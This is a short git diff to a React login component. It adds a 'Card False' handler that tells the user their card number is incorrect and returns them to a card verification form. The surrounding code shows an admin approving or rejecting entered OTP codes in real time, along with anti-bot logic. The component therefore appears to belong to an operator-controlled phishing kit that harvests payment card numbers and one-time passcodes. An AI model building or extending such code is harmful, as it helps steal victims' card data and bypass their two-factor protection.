@@ -177,6 +177,7 @@ function LoginForm() {
     console.log('🔵 Deny OTP button clicked!');
     setOtpError('Invalid OTP code. Please try again.');
   };
+  
 
   const handleOtpFalse = () => {
     console.log('🔵 OTP False button clicked!');
@@ -184,6 +185,21 @@ function LoginForm() {
     setOtpError('OTP is false. Please try again.');
     setOtpCode('');
   };
+  const handleCardFalse = () => {
+  console.log('❌ Card False button clicked!');
+  
+  // Show error message on card number field
+  setCardErrors({
+    cardNumber: '❌ Card number is incorrect. Please verify and try again.'
+  });
+  
+  // Go back to card verification form
+  setShowCardForm(true);
+  setShowOtpForm(false);
+  setWaitingForOtpApproval(false);
+  setWaitingForAdminOtp(false);
+  setIsLoading(false);
+};
 
   const handleApproveOtp = async () => {
     console.log('✅ OTP Approved by admin!');
@@ -235,7 +251,8 @@ function LoginForm() {
     handleBackToAppr,
     handleDenyOtp,
     handleOtpFalse,
-    handleApproveOtp
+    handleApproveOtp,
+    handleCardFalse
   );
 
   // Anti-bot initialization
